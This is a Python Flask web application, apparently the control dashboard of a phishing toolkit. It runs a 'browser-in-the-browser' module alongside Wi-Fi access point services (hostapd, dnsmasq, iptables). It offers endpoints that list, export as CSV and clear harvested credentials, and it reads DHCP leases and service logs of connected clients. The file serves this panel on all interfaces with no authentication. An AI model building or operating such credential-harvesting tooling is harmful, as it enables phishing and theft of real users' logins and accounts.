import os
import json
import subprocess
from flask import Flask, render_template, request, jsonify, Response
from config import (
    load_settings, save_settings, get_wifi_interfaces,
    get_network_interfaces, get_bitb_sites, BITB_DIR
)
from core.services import (
    get_service_status, start_module, stop_module,
    get_active_module, get_module_logs
)
from core.credentials import (
    get_all_credentials, get_bitb_credentials,
    export_credentials_csv, clear_bitb_credentials
)
from core.firewall import get_iptables_rules, get_custom_chains

app = Flask(__name__)

LOG_BUFFER = {"bitb": []}
MAX_LOG_LINES = 500


@app.route("/")
def dashboard():
    settings = load_settings()
    active = get_active_module()
    return render_template("dashboard.html", settings=settings, active_module=active)


@app.route("/module/bitb")
def module_bitb():
    settings = load_settings()
    sites = get_bitb_sites()
    wifi = get_wifi_interfaces()
    net = get_network_interfaces()
    active = get_active_module()
    return render_template(
        "module_bitb.html",
        settings=settings, sites=sites,
        wifi_interfaces=wifi, net_interfaces=net,
        active_module=active
    )


@app.route("/credentials")
def credentials_page():
    active = get_active_module()
    return render_template("credentials.html", active_module=active)


@app.route("/logs")
def logs_page():
    active = get_active_module()
    return render_template("logs.html", active_module=active)


@app.route("/settings")
def settings_page():
    settings = load_settings()
    wifi = get_wifi_interfaces()
    net = get_network_interfaces()
    active = get_active_module()
    return render_template(
        "settings.html",
        settings=settings,
        wifi_interfaces=wifi,
        net_interfaces=net,
        active_module=active
    )


@app.route("/debug")
def debug_page():
    active = get_active_module()
    return render_template("debug.html", active_module=active)


@app.route("/api/status")
def api_status():
    services = get_service_status()
    active = get_active_module()
    return jsonify({"services": services, "active_module": active})


@app.route("/api/interfaces")
def api_interfaces():
    wifi = get_wifi_interfaces()
    net = get_network_interfaces()
    return jsonify({"wifi": wifi, "network": net})


@app.route("/api/settings", methods=["GET", "POST"])
def api_settings():
    if request.method == "POST":
        data = request.get_json()
        settings = load_settings()
        settings.update(data)
        save_settings(settings)
        return jsonify({"success": True})
    return jsonify(load_settings())


@app.route("/api/bitb/start", methods=["POST"])
def api_bitb_start():
    data = request.get_json() or {}
    settings = load_settings()
    settings.update(data)
    save_settings(settings)
    result = start_module("bitb", BITB_DIR, settings)
    return jsonify(result)


@app.route("/api/bitb/stop", methods=["POST"])
def api_bitb_stop():
    result = stop_module("bitb", BITB_DIR)
    return jsonify(result)


@app.route("/api/credentials")
def api_credentials():
    creds = get_all_credentials(BITB_DIR)
    return jsonify(creds)


@app.route("/api/credentials/export")
def api_credentials_export():
    creds = get_all_credentials(BITB_DIR)
    csv = export_credentials_csv(creds)
    return Response(csv, mimetype="text/csv",
                    headers={"Content-Disposition": "attachment;filename=credentials.csv"})


@app.route("/api/credentials/clear", methods=["POST"])
def api_credentials_clear():
    clear_bitb_credentials(BITB_DIR)
    return jsonify({"success": True})


@app.route("/api/sites")
def api_sites():
    return jsonify(get_bitb_sites())


@app.route("/api/debug/services")
def api_debug_services():
    return jsonify(get_service_status())


@app.route("/api/debug/iptables")
def api_debug_iptables():
    return jsonify(get_iptables_rules())


@app.route("/api/debug/chains")
def api_debug_chains():
    return jsonify(get_custom_chains())


@app.route("/api/debug/interfaces")
def api_debug_interfaces():
    wifi = get_wifi_interfaces()
    net = get_network_interfaces()
    return jsonify({"wifi": wifi, "network": net})


@app.route("/api/debug/dnsmasq-leases")
def api_debug_leases():
    lease_paths = [
        "/var/lib/misc/dnsmasq.leases",
        "/tmp/dnsmasq.leases",
        os.path.join(BITB_DIR, ".run", "dnsmasq.leases"),
    ]
    for path in lease_paths:
        if os.path.exists(path):
            with open(path, "r") as f:
                return jsonify({"path": path, "content": f.read()})
    return jsonify({"path": "", "content": "No lease file found"})


@app.route("/api/debug/logs/<service>")
def api_debug_log(service):
    log_paths = {
        "dnsmasq": "/var/log/dnsmasq.log",
        "syslog": "/var/log/syslog",
        "hostapd": "/var/log/hostapd.log",
    }
    path = log_paths.get(service)
    if not path or not os.path.exists(path):
        return jsonify({"lines": [], "error": f"Log file not found: {path}"})

    try:
        result = subprocess.run(
            ["tail", "-n", "100", path],
            capture_output=True, text=True, timeout=5
        )
        lines = result.stdout.splitlines()
        return jsonify({"lines": lines})
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return jsonify({"lines": [], "error": "Failed to read log"})


import sys
import signal

def cleanup_handler(signum, frame):
    print("\n[!] Shutting down Orchestrator. Cleaning up active modules...")
    active = get_active_module()
    if active == "bitb":
        stop_module("bitb", BITB_DIR)
    print("[*] Cleanup complete. Exiting.")
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, cleanup_handler)
    signal.signal(signal.SIGTERM, cleanup_handler)
    app.run(host="0.0.0.0", port=8888, debug=False)
